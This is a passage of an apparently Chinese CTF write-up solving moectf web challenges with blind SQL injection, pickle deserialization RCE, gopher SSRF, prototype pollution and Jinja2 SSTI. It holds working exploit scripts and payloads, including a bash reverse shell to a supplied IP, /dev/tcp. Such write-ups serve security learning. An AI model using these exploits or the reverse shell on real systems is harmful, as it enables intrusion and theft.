    dbname = blind("database()")
    print(f"[+] database = {dbname}")
```

还有一个更快的脚本
- 提速原理：一次盲注 = 大约 L × 7 次 HTTP 请求（每格 7 次二分）。
这些请求存在依赖关系吗？

    猜长度：1 次二分链，必须串行 —— 无法并行
    猜字符：位置 i 的字符只由 substr(expr, i, 1) 决定，
            和其他位置完全无关 —— 第 1 格、第 2 格……
            谁先问出来都不影响别人

- 结论：猜字符的 L 个任务是【互相独立】的，
可以把它们丢给多个"工人线程"同时去问，理论上快 L 倍。

- 注：这里是网络 I/O 密集型任务 —— 线程发请求后就在
等待服务器响应（阻塞），等的时候 CPU 空闲，可以立刻
让别的线程接着发。所以即便 Python 有 GIL（全局解释器锁），
多线程对"等网络"依然有效；真正吃 CPU 的活才需要用多进程。

```python
import urllib.request  # 发 HTTP 请求、收响应
import urllib.parse  # 把参数编码成表单格式（urlencode）
from concurrent.futures import ThreadPoolExecutor  # 线程池：并发发请求

URL = "http://127.0.0.1:57267/"


def ok(payload: str) -> bool:
    """发一个请求，判断 SQL 条件是否成立。

    页面【没有】出现"没有找到匹配记录"就说明条件为真，返回 True。
    """
    # ---------- 构造请求 ----------
    # urlencode 把 {"id": 内容} 编码成表单查询串（空格变 +、= 变 %3D），
    # .encode() 再转成 bytes —— 因为 Request 的 data 只收字节。
    data = urllib.parse.urlencode({"id": payload}).encode()

    # ---------- 发送并重试 ----------
    # 目标服务偶尔掐断连接，最多重试 10 次，全失败才抛异常。
    for _ in range(10):
        try:
            # data 非空 => urlopen 自动用 POST；15 秒没响应算一次失败
            req = urllib.request.Request(URL, data=data)
            body = urllib.request.urlopen(req, timeout=15).read().decode("utf-8", "replace")
            # 核心判据：没出现"没有找到匹配记录" => 有记录 => True
            return "没有找到匹配记录" not in body
        except Exception:
            continue  # 网络异常就进入下一轮重试

    raise RuntimeError(f"request failed: {payload}")


def blind_len(expr: str) -> int:
    """第 1 步：二分猜字符串长度，返回精确长度值。

    只能串行 —— 因为下一步要等它确定循环上界。
    """
    # 二分思想：答案在 [lo, hi] 里，每次问中点，把区间砍掉一半。
    # 上界 400 是随便给的"足够大"值；库名/表名/flag 都远小于它。
    lo, hi = 0, 400
    while lo < hi:
        mid = (lo + hi) // 2  # // 是整数除法，得到中点
        # 拼出 "1 and char_length(字符串)>200" 这类条件：
        # ok() 为真 => 长度比 mid 大 => 收缩下界，否则收缩上界
        if ok(f"1 and char_length({expr})>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo  # 区间缩成一个点时，这个点就是长度


def blind_char(expr: str, i: int) -> str:
    """第 2 步：二分猜第 i 个位置的字符，返回该字符。

    每个位置独立 -> 这是可以被并发调用的"最小任务单元"。
    """
    # 每个位置重复同一套二分；候选范围是可打印 ASCII [31, 127]。
    lo, hi = 31, 127
    while lo < hi:
        mid = (lo + hi) // 2
        # "1 and ascii(substr(字符串,3,1))>70"：
        #   substr(s,i,1) 取第 i 个字符，ascii() 把字符转成数字
        if ok(f"1 and ascii(substr({expr},{i},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)  # chr(n)：ASCII 数字还原成字符


def blind(expr: str, workers: int = 12) -> str:
    """总调度：先猜长度，再开 12 个线程并发猜所有位置。

    用法：blind("database()") 返回数据库名（和串行版完全一样）。
    """
    # ============ 第一步：串行猜长度 ============
    # 长度不确定，就无法确定 substr 的下标要循环到几。
    # expr[:60] 只是打印时截断，避免超长 SQL 刷屏。
    length = blind_len(expr)
    print(f"[*] length({expr[:60]}...) = {length}", flush=True)

    # ============ 第二步：线程池并发猜字符 ============
    # ThreadPoolExecutor：一个"工人池"，max_workers=12 表示同时 12 个线程干活。
    # pool.map(函数, 可迭代对象)：
    #   把 range(1, length+1) 里的每个 i 都交给工人去调 blind_char(expr, i)，
    #   结果会【按 i 的顺序】收集回来，不乱序 —— 不需要自己拼位置。
    # lambda i: blind_char(expr, i) 是一个临时小函数，
    #   相当于把"expr"这个参数提前绑死，map 只负责喂不同的 i。
    # with 语句块结束时会自动调用 shutdown()，等所有线程跑完才退出。
    with ThreadPoolExecutor(max_workers=workers) as pool:
        chars = list(pool.map(lambda i: blind_char(expr, i), range(1, length + 1)))

    return "".join(chars)  # 字符列表按顺序拼回完整字符串


# 直接运行本文件时 __name__ == "__main__"，执行下面演示；
# 被 import（from sqli_fast import blind）时不会执行 —— 便于复用。
if __name__ == "__main__":
    # 自检：恒真应有记录、恒假应提示没找到，都满足才继续
    assert ok("1 and 1=1") and not ok("1 and 1=2")
    # 直接演示"爆列名"：查 flag_table 有哪些列
    cols = blind(
        "(select group_concat(column_name) from information_schema.columns "
        "where table_schema=database() and table_name='flag_table')"
    )
    print("[+] flag_table columns =", cols, flush=True)
```

得到日志：
```
[*] length((select group_concat(table_name) from information_schema.tables where table_schema=database())) = 37
    [1/37] 'f'
    [2/37] 'l'
    [3/37] 'a'
    [4/37] 'g'
    [5/37] '_'
    [6/37] 't'
    [7/37] 'a'
    [8/37] 'b'
    [9/37] 'l'
    [10/37] 'e'
    [11/37] ','
    [12/37] 'p'
    [13/37] 'a'
    [14/37] 's'
    [15/37] 't'
    [16/37] '_'
    [17/37] 'p'
    [18/37] 'a'
    [19/37] 'p'
    [20/37] 'e'
    [21/37] 'r'
    [22/37] ','
    [23/37] 'p'
    [24/37] 'u'
    [25/37] 'b'
    [26/37] 'l'
    [27/37] 'i'
    [28/37] 'c'
    [29/37] '_'
    [30/37] 's'
    [31/37] 'u'
    [32/37] 'b'
    [33/37] 'j'
    [34/37] 'e'
    [35/37] 'c'
    [36/37] 't'
    [37/37] 's'
[+] tables = flag_table,past_paper,public_subjects
```

---

# 日志系统

## 小D同学在某比赛见到了一个日志系统，拼尽全力无法战胜，于是他再也不相信别人的系统了，遂自己开发了一个日志系统，支持日志导入和导出

## 附件：
```python
import pickle
import time
import uuid
from urllib.parse import quote

from flask import Flask, request, redirect, Response, render_template

app = Flask(__name__)

# 内存中的日志列表，每条日志是一个对象
LOGS = []


class LogEntry:
    """
    小D觉得用自定义对象比字典更有面向对象的感觉，
    并且导出/导入时直接用 pickle 序列化整个列表，方便又强大！
    """

    def __init__(self, title, content):
        self.id = uuid.uuid4().hex[:8]
        self.title = title
        self.content = content
        self.created_at = time.strftime("%Y-%m-%d %H:%M:%S")

    def to_dict(self):
        return {
            "id": self.id,
            "title": self.title,
            "content": self.content,
            "created_at": self.created_at,
        }


def get_logs_for_display():
    result = []
    for log in LOGS:
        if isinstance(log, LogEntry):
            result.append(log.to_dict())
        else:
            result.append(log)
    return result


@app.route("/")
def index():
    msg = request.args.get("msg", "")
    err = request.args.get("err", "")
    return render_template(
        "index.html",
        msg=msg,
        err=err,
        logs=get_logs_for_display(),
    )


@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title", "").strip()
    content = request.form.get("content", "").strip()
    if not title or not content:
        return redirect("/?err=标题和内容不能为空")
    LOGS.append(LogEntry(title, content))
    return redirect("/?msg=日程添加成功")


@app.route("/export")
def export():
    data = pickle.dumps(LOGS)
    return Response(
        data,
        mimetype="application/octet-stream",
        headers={"Content-Disposition": "attachment; filename=logs.pkl"},
    )


@app.route("/import", methods=["POST"])
def import_logs():
    """
    小D为了兼容各种数据，直接对上传内容执行反序列化，
    还能把还原出来的对象直接展示出来，方便预览。
    """
    f = request.files.get("file")
    if not f or not f.filename:
        return redirect("/?err=请选择要导入的文件")
    data = f.read()
    if not data:
        return redirect("/?err=文件内容为空")
    try:
        obj = pickle.loads(data)
    except Exception as e:
        return redirect("/?err=反序列化失败：" + str(e)[:200])

    # 兼容单条/多条日志
    if isinstance(obj, list):
        n = 0
        for item in obj:
            LOGS.append(item)
            n += 1
        return redirect("/?msg=" + quote("成功导入 {} 条日程".format(n)))

    # 单个对象 / 其他：把反序列化结果直接展示出来供预览
    preview = str(obj).replace("\n", " ").replace("\r", " ").strip()[:200]
    return redirect("/?msg=" + quote("导入预览结果：" + preview))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=20005, debug=False)
```

总结附件：
| 路由 | 作用 | 关键代码 |
|---|---|---|
| `GET /` | 首页，列出所有日志 | 从 `LOGS` 列表渲染 |
| `POST /add` | 新增一条日志（表单） | `LOGS.append(LogEntry(...))` |
| `GET /export` | 把 `LOGS` 整个 pickle 序列化后导出 | `data = pickle.dumps(LOGS)` |
| `POST /import` | 接收上传文件并 pickle 反序列化 | **`obj = pickle.loads(data)`** |
说明要利用反序列化漏洞

看`import_logs`可以发现上传的文件都会执行
```python
f = request.files.get("file")
    if not f or not f.filename:
        return redirect("/?err=请选择要导入的文件")
    data = f.read()
    if not data:
        return redirect("/?err=文件内容为空")
    try:
        obj = pickle.loads(data)
    except Exception as e:
        return redirect("/?err=反序列化失败：" + str(e)[:200])
```
可以拿到RCE

那么根据这些来编写脚本

1. 先构造payload
```python
def make_payload(cmd: str) -> bytes:
    class Exploit:
        def __reduce__(self):
            return (eval, ("__import__('os').popen({!r}).read()".format(cmd),))
    return pickle.dumps(Exploit())
```
- `__reduce__` 返回 `(callable, args)` 元组，反序列化时 = `callable(*args)`
- `callable = eval`，`args = ("__import__('os').popen(cmd).read()",)`
  - `__import__('os')` 显式导入 os 模块（eval 里没有现成命名空间）
  - `popen(cmd).read()` 跑命令并拿到 stdout 字符串
- 用 `"{!r}".format(cmd)` 做 repr 转义，单引号不会破坏外层字符串字面量
- `pickle.dumps(Exploit())` 序列化 → 这串字节里就藏着上面的"构造指令"

2. 上传 + 取回显
```python
def run_once(cmd: str) -> str:
    payload = make_payload(cmd)
    files = {"file": ("exploit.pkl", payload, "application/octet-stream")}
    r = requests.post(f"{TARGET}/import", files=files, allow_redirects=True)

    from urllib.parse import urlparse, parse_qs
    qs = parse_qs(urlparse(r.url).query)
    msg = qs.get("msg", [""])[0]
    return msg
```
- Flask 的 `requests` 默认会自动跟 302 redirect，所以 `r.url` 最终落在 `/?msg=...`
- 服务端把 `obj` 用 `str()` 显示并塞进 `?msg=`（注意 app.py 第 103 行 `preview = str(obj)...[:200]`）
- 我们从 URL 的 query 里把 `msg` 抠出来，就是命令输出

3. 命令行分发
```python
if sys.argv[1] == "--shell":     shell()
elif sys.argv[1] == "--reverse": reverse_shell(ip, port)
else:                            print(run_once(sys.argv[1]))
```

三种模式：
- `python3 exp.py "ls /"` — 单次命令，直接打印输出
- `python3 exp.py --shell` — 进入 `$ ` 提示符，每行当命令发一次
- `python3 exp.py --reverse 1.2.3.4 9000` — 反弹 shell（前提是你在本机 `nc -lvnp 9000` 监听）

结果：
```bash
$ python3 exp.py "ls /"
导入预览结果：app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

$ python3 exp.py "env | grep -i flag"
导入预览结果：FLAG=moectf{7be29f02-c787-303f-83e1-cb9ace03d26e}

$ python3 exp.py "id; hostname; uname -a; whoami"
导入预览结果：uid=1000(ctf) gid=1000(ctf) groups=1000(ctf) ret2shell-1433-21435-1788942790 Linux ret2shell-1433-21435-1788942790 6.12.94+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.94-1 (2026-06-20) x86_64 GNU/L
```

总脚本：
```python
import pickle
import sys
import io
from urllib.parse import urlparse, parse_qs, unquote
from urllib.request import urlopen, Request

TARGET = "http://127.0.0.1:64321"

def make_payload(cmd: str) -> bytes:
    class Exploit:
        def __reduce__(self):
            return (eval, ("__import__('os').popen({!r}).read()".format(cmd),))

    return pickle.dumps(Exploit())

def http_post_multipart(url, files):
    boundary = "----workbuddy-expboundary-7be29f02"
    body = io.BytesIO()

    for k, (fname, data, ctype) in files.items():
        body.write(f"--{boundary}\r\n".encode())
        body.write(
            f'Content-Disposition: form-data; name="{k}"; filename="{fname}"\r\n'.encode()
        )
        body.write(f"Content-Type: {ctype}\r\n\r\n".encode())
        body.write(data)
        body.write(b"\r\n")

    body.write(f"--{boundary}--\r\n".encode())

    req = Request(
        url,
        data=body.getvalue(),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    return urlopen(req)


def run_once(cmd: str) -> str:
    payload = make_payload(cmd)
    files = {"file": ("exploit.pkl", payload, "application/octet-stream")}
    r = http_post_multipart(f"{TARGET}/import", files)
    qs = parse_qs(urlparse(r.url).query)
    msg = qs.get("msg", [""])[0]
    return unquote(msg)


def shell():
    print("[*] 进入交互 shell，输入 :quit 退出")
    while True:
        try:
            cmd = input("$ ")
        except EOFError:
            break
        if cmd.strip() in (":quit", "exit", "quit"):
            break
        if not cmd.strip():
            continue
        out = run_once(cmd)
        print(out)


def reverse_shell(ip: str, port: int):
    cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    payload = make_payload(cmd)
    files = {"file": ("exploit.pkl", payload, "application/octet-stream")}
    http_post_multipart(f"{TARGET}/import", files)
    print(f"[*] 反弹 shell payload 已发，请监听 {port}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    if sys.argv[1] == "--shell":
        shell()
    elif sys.argv[1] == "--reverse":
        reverse_shell(sys.argv[2], int(sys.argv[3]))
    else:
        cmd = sys.argv[1]
        print(run_once(cmd))
```

---

# 熊出没

## 在遥远的狗粉岭中，生活着两只可爱的熊，他们在找蜂蜜的路上发现了许多蜜罐，但是有些蜜罐似乎是猎人为了捕获他们而设置的陷阱，他们能顺利吃到蜂蜜吗?(蜂蜜在54321端口)

随便乱输一个url，出现提示
```
URL不合法！请输入完整的 URL 地址（需包含协议和主机，例如 gopher://host:port/...）。
```

那么根据提示输入
```
gopher://127.0.0.1:54321
```
返回
```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 33

Honey Vault
paths: /secret-honey
```

然后输入
```
gopher://127.0.0.1:54321/secret-honey
```
```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 29

404 No honey at /ecret-honey
```

可以看出来`s`被吞了，再打多一个`/`来保护`s`
```
gopher://127.0.0.1:54321//secret-honey
```
```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 45

moectf{6ce0743d-8995-c631-df82-1f50ba106215}
```

---

# 礼崩乐坏

## 我听闻，从前管束子弟，有家法、有规矩、有祖宗传下来的章法。做父亲的教儿子，做兄长的带弟弟，一代一代，都守着本分。可如今呢？家法松了，规矩淡了，晚辈做什么，长辈也未必看得住。

## 这就好比写JavaScript，顶层的写法，像祖宗留下的旧宅，格局分明，门是门、窗是窗；可后来的人，图省事、图新潮，把旧宅拆了，东拼西凑搭个棚子，也能住人。祖宗留下的规矩还在，但已经管不着他们了。这样看来，礼法不是没了，是没人肯照着做了。名分还在，人心却散了。

进入网页发现：
```
配置中心
GET  /api/help      查看接口说明
GET  /api/me        查看当前配置
POST /api/profile   提交 JSON 配置
GET  /api/flag      读取审核后的结果
```

直接读/api/flag发现:
```json
{
  "ok": false,
  "message": "审核未通过",
  "inheritedProbe": {
    "isAdmin": null,
    "canReadFlag": null
  }
}
```

`/api/me` 返回：

```json
{
  "profile": { "profile": { "nickname": "guest" }, "setting": { "mode": "normal" } },
  "inheritedProbe": { "isAdmin": null, "canReadFlag": null }
}
```

`inheritedProbe`（继承探针），这两个属性不在对象自己身上，要从原型链上继承下来。属性的祖宗是`Object.prototype`，根据题意可以发现是要让`Object.prototype`多出`isAdmin: true`。

这是原型污染题，且有键名黑名单，需要绕过。只有审核 `isAdmin=true` 且 `canReadFlag=true` 时返回 FLAG。

写一个黑名单探测脚本：
```python
import json
import sys
import urllib.request

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:57970")

def post_raw(body_str):
    """
    直接发送原始 JSON 字符串。
    注意：不能统一用 json.dumps(dict) —— 有个测试用例必须在报文里
    保留 \\u005f 转义序列（发送前不希望它被还原成下划线），
    所以这里统一收字符串，dict 由调用方先 dumps。
    """
    req = urllib.request.Request(
        BASE + "/api/profile", data=body_str.encode(), method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())

def d(obj):
    return json.dumps(obj)

CASES = [
    ("基准：合法短字符串",        d({"a": "x"})),
    ("对象值",                   d({"a": {"b": 1}})),
    ("数组值",                   d({"a": [1, 2]})),
    ("超长字符串值",             d({"a": "A" * 1000})),
    ("合法值 + __proto__ 键",     d({"__proto__": "AAAA"})),
    ("合法值 + __proto__.x 键",  d({"__proto__.x": True})),
    ("合法值 + Unicode转义键",    '{"\\u005f\\u005fproto\\u005f": "AAAA"}'),
    ("合法值 + constructor 键",   d({"constructor": "AAAA"})),
    ("合法值 + prototype 键",     d({"prototype": "AAAA"})),
    ("constructor.prototype 路径", d({"constructor.prototype.x": True})),
    ("点号嵌套路径",             d({"profile.nickname": "probe"})),
    ("大小写变体 __PROTO__",     d({"__PROTO__": "AAAA"})),
    ("部分匹配 _proto",          d({"_proto": "AAAA"})),
]

def classify(resp):
    """把响应归到三类，方便肉眼对比差分"""
    if resp.get("ok"):
        return " 通过", "被接受"
    msg = resp.get("message", str(resp))
    if "布尔" in msg or "字符串" in msg:
        return "A值类型报错", msg
    if "礼制" in msg:
        return "B键名黑名单报错", msg
    return "❓ 其他", msg

print(f"目标: {BASE}\n" + "=" * 62)
for label, body in CASES:
    resp = post_raw(body)
    tag, detail = classify(resp)
    print(f"[{tag}] {label}")
    print(f"         报文: {body[:70]}{'...' if len(body) > 70 else ''}")
    print(f"         结果: {detail}")
    print("-" * 62)

```

```
目标: http://127.0.0.1:57970
==============================================================
[ 通过] 基准：合法短字符串
         报文: {"a": "x"}
         结果: 被接受
--------------------------------------------------------------
[A值类型报错] 对象值
         报文: {"a": {"b": 1}}
         结果: 配置值仅允许布尔值、数字、短字符串或 null
--------------------------------------------------------------
[A值类型报错] 数组值
         报文: {"a": [1, 2]}
         结果: 配置值仅允许布尔值、数字、短字符串或 null
--------------------------------------------------------------
[A值类型报错] 超长字符串值
         报文: {"a": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
         结果: 配置值仅允许布尔值、数字、短字符串或 null
--------------------------------------------------------------
[B键名黑名单报错] 合法值 + __proto__ 键
         报文: {"__proto__": "AAAA"}
         结果: 此举不合礼制
--------------------------------------------------------------
[B键名黑名单报错] 合法值 + __proto__.x 键
         报文: {"__proto__.x": true}
         结果: 此举不合礼制
--------------------------------------------------------------
[ 通过] 合法值 + Unicode转义键
         报文: {"\u005f\u005fproto\u005f": "AAAA"}
         结果: 被接受
--------------------------------------------------------------
[ 通过] 合法值 + constructor 键
         报文: {"constructor": "AAAA"}
         结果: 被接受
--------------------------------------------------------------
[ 通过] 合法值 + prototype 键
         报文: {"prototype": "AAAA"}
         结果: 被接受
--------------------------------------------------------------
[❓ 其他] constructor.prototype 路径
         报文: {"constructor.prototype.x": true}
         结果: Cannot create property 'prototype' on string 'AAAA'
--------------------------------------------------------------
[ 通过] 点号嵌套路径
         报文: {"profile.nickname": "probe"}
         结果: 被接受
--------------------------------------------------------------
[ 通过] 大小写变体 __PROTO__
         报文: {"__PROTO__": "AAAA"}
         结果: 被接受
--------------------------------------------------------------
[ 通过] 部分匹配 _proto
         报文: {"_proto": "AAAA"}
         结果: 被接受
--------------------------------------------------------------
```

 结论：由差分结果反推出的校验逻辑 
1. A 分支（值类型检查，先执行）
   值只允许 布尔/数字/短字符串/null；
   对象、数组、超长字符串一律拒绝 → 所以 __proto__ 直传对象必死。
2. B 分支（键名黑名单，后执行）
   键名含 "__proto__" 字样即拒（子串匹配，大小写敏感）；
   "constructor"/"prototype" 不在名单里。
3. 通过分支（点号路径解析）
   键按 '.' 拆段逐级下钻写入。
   ==> constructor.prototype 不含 __proto__ 字样、可过黑名单，
       而路径解析后指向 Object.prototype，等价于污染。

随手提交一个带点号的键试探：

```bash
curl -X POST http://127.0.0.1:57970/api/profile -H 'Content-Type: application/json' -d '{"profile.nickname":"haha"}'
```
发现
```json
{
  "ok": true,
  "accepted": ["profile.nickname"],
  "profile": { "profile": { "nickname": "haha" }, ... }
}
```
说明服务端把点号键按路径解析
那么
```bash
curl -X POST http://127.0.0.1:55774/api/profile \
  -H 'Content-Type: application/json' \
  -d '{"constructor.prototype.isAdmin": true, "constructor.prototype.canReadFlag": true}'
```

返回：

```json
{
  "ok": true,
  "accepted": ["constructor.prototype.isAdmin", "constructor.prototype.canReadFlag"],
  "inheritedProbe": { "isAdmin": true, "canReadFlag": true }
}
```

探针已经亮了。读 flag：

```bash
curl http://127.0.0.1:55774/api/flag
```

```json
{ "ok": true, "flag": "moectf{wh3n_r1t35_f4ll_pr0707yp35_ru13}" }
```

攻击脚本：
```python
import json
import sys
import urllib.request

# 目标地址，可从命令行覆盖
BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:55774")

def get(path):
    #发 GET 请求，返回解析后的 JSON
    with urllib.request.urlopen(BASE + path, timeout=5) as resp:
        return json.loads(resp.read())

def post(path, data):
    #发 POST 请求，data 是 dict，自动转 JSON 并设置请求头
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        BASE + path, data=body, method="POST",
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        return json.loads(resp.read())

# 确认服务存活 
me = get("/api/me")
print("[*] 当前 inheritedProbe:", me["inheritedProbe"])

# 构造污染 payload 
# 键走 constructor.prototype 旁门，值用布尔原始类型绕过类型检查
payload = {
    "constructor.prototype.isAdmin": True,
    "constructor.prototype.canReadFlag": True,
}
result = post("/api/profile", payload)
print("[*] 提交结果:", result["accepted"])

# 验证污染是否生效 
me = get("/api/me")
probe = me["inheritedProbe"]
print("[*] 污染后 inheritedProbe:", probe)
assert probe["isAdmin"] is True and probe["canReadFlag"] is True

flag = get("/api/flag")
print("[+] FLAG:", flag["flag"])
```

---

# bblogin

## 管理员做了个简单的系统来保护自己的小秘密，非常安全！

## 诶不对源码怎么被人偷出来了，谁干的？没事我相信就算你知道源码也拿不到我的小秘密

## 附件：
```python
import sys
import secrets
from flask import Flask, request, session, jsonify, redirect, url_for
from flask import render_template_string


def match(a,b):
    for i in a:
        if(i in b):
            return True;
    return False
def create_app():
    app = Flask(__name__)

    app.secret_key = secrets.token_hex(32)
    Rea1f1Agg999mjytredcvbhjytredf = sys.argv[1] if len(sys.argv) > 1 else 'flag{fake_flag}'
    I3TheAdMin_pa3vv0rc1dswer5t6yuhgfdrt = secrets.token_hex(32)


    INDEX_TEMPLATE = '''<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>用户管理系统</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
    }
    .card {
      background: #fff; border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px 36px; width: 380px;
    }
    h1 { font-size: 22px; color: #333; text-align: center; margin-bottom: 8px; }
    .subtitle { font-size: 13px; color: #888; text-align: center; margin-bottom: 28px; }
    .form-group { margin-bottom: 18px; }
    label { display: block; font-size: 14px; color: #555; margin-bottom: 6px; font-weight: 500; }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 11px 14px; border: 1.5px solid #ddd;
      border-radius: 8px; font-size: 15px; outline: none; transition: border-color 0.2s;
    }
    input:focus { border-color: #667eea; }
    button {
      width: 100%; padding: 12px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #fff; border: none; border-radius: 8px;
      font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px;
    }
    button:hover { opacity: 0.9; }
    .error {
      background: #fff0f0; color: #d33; border: 1px solid #fcc;
      border-radius: 8px; padding: 10px 12px; font-size: 14px;
      margin-bottom: 16px; text-align: center;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>用户管理系统</h1>
    <p class="subtitle">这是一个简单的用户管理系统，请输入用户名和密码登录</p>

    {login_error_block}

    <form method="POST" action="/login">
      <div class="form-group">
        <label for="username">用户名</label>
        <input type="text" id="username" name="username" placeholder="请输入用户名" required />
      </div>
      <div class="form-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" placeholder="请输入密码" required />
      </div>
      <button type="submit">登 录</button>
    </form>
  </div>
</body>
</html>'''

    USERINFO_TEMPLATE = '''<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>用户信息</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
    }
    .card {
      background: #fff; border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px 36px; width: 420px; text-align: center;
    }
    .avatar {
      width: 72px; height: 72px; border-radius: 50%;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      display: flex; align-items: center; justify-content: center;
      margin: 0 auto 20px; font-size: 32px; color: #fff;
    }
    h1 { font-size: 22px; color: #333; margin-bottom: 24px; }
    h1 span { color: #667eea; font-weight: 700; }
    .secret-box {
      background: #f7f8ff; border: 1.5px solid #e0e4ff;
      border-radius: 10px; padding: 20px; text-align: left;
    }
    .secret-box .label { font-size: 13px; color: #888; margin-bottom: 8px; }
    .secret-box .info { font-size: 16px; color: #333; line-height: 1.6; word-break: break-word; }
    .loading { color: #888; font-size: 15px; padding: 20px 0; }
    .error-msg {
      background: #fff0f0; color: #d33; border: 1px solid #fcc;
      border-radius: 8px; padding: 12px 16px; font-size: 14px;
    }
    .logout-btn {
      display: inline-block; margin-top: 24px; padding: 9px 28px;
      background: transparent; border: 1.5px solid #ccc; border-radius: 8px;
      font-size: 14px; color: #666; cursor: pointer; text-decoration: none;
    }
    .logout-btn:hover { border-color: #667eea; color: #667eea; }
  </style>
</head>
<body>
  <div class="card">
    <div class="avatar">👤</div>
    <h1>欢迎 <span id="usernameEl">加载中...</span></h1>
    <div id="content"><p class="loading">正在获取您的信息...</p></div>
    <a class="logout-btn" href="/">退出登录</a>
  </div>
  <script>
    async function loadUserInfo() {
      const usernameEl = document.getElementById('usernameEl');
      const contentEl  = document.getElementById('content');
      try {
        const res = await fetch('/user');
        if (!res.ok) { window.location.href = '/'; return; }
        const data = await res.json();
        usernameEl.textContent = data.username || '未知用户';
        contentEl.innerHTML = '<div class="secret-box">'
          + '<div class="label">🔒 这是你的秘密信息</div>'
          + '<div class="info">' + (data.info || '暂无') + '</div></div>';
      } catch (e) {
        usernameEl.textContent = '用户';
        contentEl.innerHTML = '<div class="error-msg">无法连接服务器，请稍后重试</div>';
      }
    }
    loadUserInfo();
  </script>
</body>
</html>'''


    @app.route('/')
    def index():
        html = INDEX_TEMPLATE.replace('{login_error_block}', '')
        return render_template_string(html)

    @app.route('/userInfo.html')
    def user_info_page():
        return render_template_string(USERINFO_TEMPLATE)

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if(len(username)>10 or match(".()[]_",username)):
            error_html = f'<div class="error"><p>The username cannot be too long!</p></div>'
            html = INDEX_TEMPLATE.replace('{login_error_block}', error_html)
            return render_template_string(html)
        if username == 'admin' and password == I3TheAdMin_pa3vv0rc1dswer5t6yuhgfdrt:
            session['token'] = "admin"
            return redirect(url_for('user_info_page'))

        error_html = f'<div class="error"><p>用户{username}登录失败</p></div>'
        html = INDEX_TEMPLATE.replace('{login_error_block}', error_html)
        return render_template_string(html)

    @app.route('/user')
    def get_user():
        token = session.get('token')
        if token and token == "admin":
            return jsonify(username='admin', info=Rea1f1Agg999mjytredcvbhjytredf)
        return jsonify({'error': '未登录'}), 401

    return app


app = create_app()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=20001, debug=False)
```

这个用的是Jina2，可以使用模版注入
可以看出来这题是SSTI 泄露 `SECRET_KEY` → 自己用同一把密钥伪造 Flask Cookie Session → 绕鉴权读 flag。

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    if(len(username)>10 or match(".()[]_",username)):
        ...
        return render_template_string(html)            # ← 没走到这行
    if username == 'admin' and password == I3TheAdMin_pa3vv0rc1dswer5t6yuhgfdrt:
        session['token'] = "admin"                     # 真账号，密码 64 位随机 hex 不可能猜中
        return redirect(url_for('user_info_page'))
    error_html = f'<div class="error"><p>用户{username}登录失败</p></div>'
    html = INDEX_TEMPLATE.replace('{login_error_block}', error_html)
    return render_template_string(html)                # ← 用户名被拼进 HTML 再渲染 = SSTI
```
可以发现`/user` 的鉴权只看 `session.get('token') == "admin"`，没密码校验。

那么要怎么往session 里塞一个 `token="admin"`
```python
if(len(username)>10 or match(".()[]_",username)):
```
说明长度要大于10，且不能有`.()[]_`

使用模版"用户{{config}}登录失败" ，Jinja2 会把 {{config}} 识别成一个变量查找节点，在调用 render 时去上下文里取 config 这个键对应的值（也就是 Flask 的 app.config），再把这个字典用 str() 打出来塞到两个普通文本节点之间，最终返回一段完整的 HTML 给浏览器。

那可以触发`{{config}}` ，返回
```
{'SECRET_KEY': '53e2da18ce4c3f37c834e4b712ee97ce4b7eae1b23a2a9f25d59276040013026', ...}
```

Flask 3.x 默认用 `URLSafeTimedSerializer` 序列化 session cookie：

```
